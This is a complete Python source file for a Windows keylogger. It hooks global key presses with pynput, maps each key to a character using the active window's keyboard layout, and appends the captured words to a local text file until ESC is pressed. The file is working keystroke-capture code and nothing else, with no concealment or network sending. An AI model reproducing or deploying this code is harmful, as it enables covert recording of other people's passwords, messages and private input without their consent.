import ctypes
import win32api
import win32gui
import win32process
from pynput.keyboard import Listener, Key

user32 = ctypes.WinDLL('user32', use_last_error=True)
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

class KeyLogger:
    def __init__(self, log_file="a.txt", max_words_per_line=10):
        self.log_file = log_file
        self.current_word = ""
        self.words_buffer = []
        self.max_words_per_line = max_words_per_line

    def get_current_layout(self):
        hwnd = win32gui.GetForegroundWindow()
        thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)
        return win32api.GetKeyboardLayout(thread_id)

    def get_char_from_key(self, vk_code):
        layout = self.get_current_layout()
        scan_code = user32.MapVirtualKeyExW(vk_code, 0, layout)
        state = (ctypes.c_ubyte * 256)()
        buf = ctypes.create_unicode_buffer(5)
        result = user32.ToUnicodeEx(vk_code, scan_code, state, buf, len(buf), 0, layout)
        if result > 0:
            return buf.value
        else:
            return ''

    def on_press(self, key):
        try:
            if key == Key.esc:
                print("\nKeylogger stopped by ESC.")
                self.flush_buffer(final=True)
                return False

            if hasattr(key, 'vk'):  # virtual key code
                char = self.get_char_from_key(key.vk)
                if char:
                    self.current_word += char
                    print(char, end='', flush=True)

            if key == Key.space:
                self._add_word_to_buffer()
                print(' ', end='', flush=True)

        except Exception as e:
            print(f"\nError: {e}")

    def _add_word_to_buffer(self, word=None):
        if word is None:
            word = self.current_word

        if word:
            self.words_buffer.append(word)
            self.current_word = ""

        if len(self.words_buffer) >= self.max_words_per_line:
            self.flush_buffer(newline=True, final=True)

    def flush_buffer(self, newline=False, final=False):
        if final and self.current_word:
            self.words_buffer.append(self.current_word)
            self.current_word = ""

        if self.words_buffer:
            with open(self.log_file, "a", encoding="utf-8") as f:
                line = ' '.join(self.words_buffer)
                if newline:
                    line += '\n'
                f.write(line)
            self.words_buffer = []

    def run(self):
        print("Keylogger started. Press ESC to stop.")
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.run()
